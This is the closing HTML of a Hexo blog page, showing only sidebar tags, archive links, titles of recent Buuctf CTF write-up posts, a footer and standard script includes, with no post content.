      <a href="/tags/CTF/" style="font-size: 20px;">CTF</a> <a href="/tags/Fuzzing/" style="font-size: 20px;">Fuzzing</a> <a href="/tags/learn/" style="font-size: 10px;">learn</a> <a href="/tags/security/" style="font-size: 10px;">security</a> <a href="/tags/%E8%AE%BA%E6%96%87%E7%BB%86%E8%AF%BB/" style="font-size: 15px;">论文细读</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Archives</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/08/">August 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">Recent Posts</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/08/14/Buuctf%20Misc%EF%BC%882-5%EF%BC%89/">Buuctf Misc（2-5）</a>
          </li>
        
          <li>
            <a href="/2023/08/13/Buuctf%20Web%EF%BC%8829-32%EF%BC%89/">Buuctf Web（29-32）</a>
          </li>
        
          <li>
            <a href="/2023/08/12/Buuctf%20Web%EF%BC%8825-28%EF%BC%89/">Buuctf Web（25-28）</a>
          </li>
        
          <li>
            <a href="/2023/08/11/Buuctf%20Web%EF%BC%8821-24%EF%BC%89/">Buuctf Web（21-24）</a>
          </li>
        
          <li>
            <a href="/2023/08/10/Buuctf%20Web%EF%BC%8817-20%EF%BC%89/">Buuctf Web（17-20）</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      
      &copy; 2023 John Doe<br>
      Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>

    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    


<script src="/js/jquery-3.6.4.min.js"></script>



  
<script src="/fancybox/jquery.fancybox.min.js"></script>




<script src="/js/script.js"></script>





  </div>
</body>
</html>